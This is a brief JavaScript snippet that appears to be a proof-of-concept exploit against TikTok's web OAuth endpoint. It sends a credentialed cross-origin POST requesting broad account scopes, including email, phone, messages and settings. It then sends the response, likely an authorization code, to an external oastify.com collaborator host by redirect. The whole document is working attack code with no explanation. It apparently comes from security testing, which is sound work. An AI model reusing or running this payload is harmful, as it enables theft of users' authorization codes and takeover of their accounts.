var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('POST', 'https://www.tiktok.com/passport/open/web/auth/v2/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.username%2Cvideo.list.private_ads.no_watermark%2Cuser.info.showcase%2Cuser.account.configure%2Ccomment.list.manage%2Cuser.setting.update%2Cuser.info.stats%2Cvideo.list.manage%2Cuser.account.type%2Cbiz.account.info%2Ccomment.list%2Clive.list%2Cuser.info.phone%2Cbiz.account.phone%2Cbizpartner.item.info%2Cbiz.account.email%2Cuser.setting.list%2Cmessage.list.admin%2Cuser.info.profile%2Cuser.info.email%2Cvideo.list.no_watermark%2Cbizpartner.user.info&aid=1459&state=cGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZmcm9tX3BhZ2U9bG9naW4md2luU2VhcmNoPXsicmVkaXJlY3QiOiJodHRwcyUzQSUyRiUyRmFkcy50aWt0b2suY29tJTJGaTE4biUyRmhvbWUlM0ZsYW5nJTNEZW4ifSZjc3JmdG9rZW49NGViNDE5OTAxNmYxMmNmNTQ4ZDI4OWQ4MTYwYzRjY2IwN2NlOTMwMiZyZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZhZHMudGlrdG9rLmNvbSUyRmkxOG4lMkZsb2dpbg..&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin&source=web&response_type=code');
req.setRequestHeader('Content-Type', 'application/json');
req.withCredentials = true;
req.send('{}');

function reqListener() {
    location='https://tyvfl9tx87rern0ad7gjh20ev51wpvdk.oastify.com/log?key='+this.responseText; 
};